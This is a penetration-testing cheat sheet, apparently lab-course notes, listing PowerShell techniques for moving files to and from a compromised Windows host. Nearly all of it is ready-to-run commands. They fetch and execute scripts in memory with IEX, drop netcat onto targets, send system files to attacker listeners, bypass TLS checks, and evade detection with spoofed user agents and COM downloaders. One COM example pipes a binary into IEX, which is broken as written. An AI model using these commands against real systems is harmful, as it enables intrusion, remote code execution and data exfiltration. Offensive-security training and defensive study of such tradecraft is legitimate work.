# PowerShell File Transfers

## Downloads — Net.WebClient

```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')

# Async variant
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')

# Fileless — download string and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1')

# Pipeline variant
(New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1') | IEX
```

## Downloads — Invoke-WebRequest

Available in PowerShell 3.0+. Slower than Net.WebClient for large files. Aliases: `iwr`, `curl`, `wget`.

```powershell
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -OutFile PowerView.ps1
```

**Common errors:**

IE first-launch not completed — add `-UseBasicParsing`:

```powershell
Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -UseBasicParsing | IEX
```

SSL/TLS untrusted certificate:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## Downloads — Start-BitsTransfer

BITS must be enabled on the target.

```powershell
Import-Module BitsTransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

## Base64 Download (No Network)

On attacker (Linux):

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

On target (Windows):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 string>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

**Note:** cmd.exe has an 8,191 character max string length. Web shells may also error on very large strings.

---

## Base64 Upload (No Network)

On target (Windows):

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5
```

On attacker (Linux):

```bash
echo '<base64>' | base64 -d > hosts
md5sum hosts
```

---

## Uploads — PSUpload.ps1

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## Uploads — Base64 POST to Netcat

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

On attacker:

```bash
nc -lvnp 8000
# Capture base64 from POST body, then:
echo '<base64>' | base64 -d -w 0 > hosts
```

## Uploads — UploadFile to PHP Receiver

On target:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://10.10.10.32/upload.php', 'C:\file.txt')
```

See [PHP Transfers](php-transfers.md) for the `upload.php` receiver script.

---

## FTP via PowerShell

```powershell
# Download
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Upload
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

## PowerShell Remoting (WinRM)

TCP/5985 (HTTP) or TCP/5986 (HTTPS). Requires admin access or `Remote Management Users` group.

```powershell
# Test connectivity
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create session
$Session = New-PSSession -ComputerName DATABASE01

# Copy file TO remote machine
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy file FROM remote machine
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## Proxy-Aware Downloader

```powershell
$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
```

---

## Evasion — User Agent Spoofing

Each transfer method has a distinct UA string. Defenders can whitelist/blacklist these:

| Method | User-Agent |
|---|---|
| Invoke-WebRequest | `Mozilla/5.0 (Windows NT; ...) WindowsPowerShell/5.1.14393.0` |
| WinHttp.WinHttpRequest.5.1 | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Msxml2.XMLHTTP | `Mozilla/4.0 (compatible; MSIE 7.0; ...)` |
| CertUtil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## Evasion — Alternative COM Download Objects

```powershell
# WinHttpRequest
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.ResponseText

# Msxml2.XMLHTTP
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.responseText
```

---

## AES Encryption (Protected Transfers)

Using [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1):

```powershell
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
# Produces scan-results.txt.aes

# Decrypt
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```
